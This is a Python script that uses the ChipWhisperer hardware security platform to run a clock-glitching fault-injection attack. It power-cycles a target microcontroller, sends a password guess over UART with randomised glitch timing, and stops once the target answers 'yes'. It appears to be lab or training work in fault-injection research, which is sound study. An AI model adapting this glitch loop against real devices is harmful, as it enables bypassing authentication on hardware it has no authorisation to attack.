#!/usr/bin/env python3

import sys
import chipwhisperer as cw

scope = cw.scope()
scope.default_setup()
target = cw.target(scope)

target.baud = 9600
print("Configuring UART")
target.init()

print("Entering glitch loop...")

scope.gain.gain = 25
scope.adc.samples=3000
scope.adc.offset = 0
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 120000000
scope.clock.adc_src = "clkgen_x4"
scope.io.tio1 = "serial_tx"
scope.io.tio2 = "serial_rx"
scope.trigger.triggers = "tio4"
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = 'ext_single'
scope.io.glitch_hp  = True
scope.io.glitch_lp = False

import random
import time

while True:
  scope.glitch.width = random.randint(5,45)
  scope.glitch.repeat = random.randint(1,5) * 8
  scope.glitch.ext_offset = random.randint(0,30 *  8)
  scope.glitch.offset = random.randint(1,45)
  scope.io.target_pwr = False
  time.sleep(0.2)
  target.ser.flush()
  scope.io.target_pwr = True
  scope.arm()
  time.sleep(0.1)
  target.ser.write("1123123\r")
  output = target.ser.read(10,timeout=100)
  scope.capture()
  print(output)
  if "yes" in output:
    target.dis()
    scope.dis()
    break
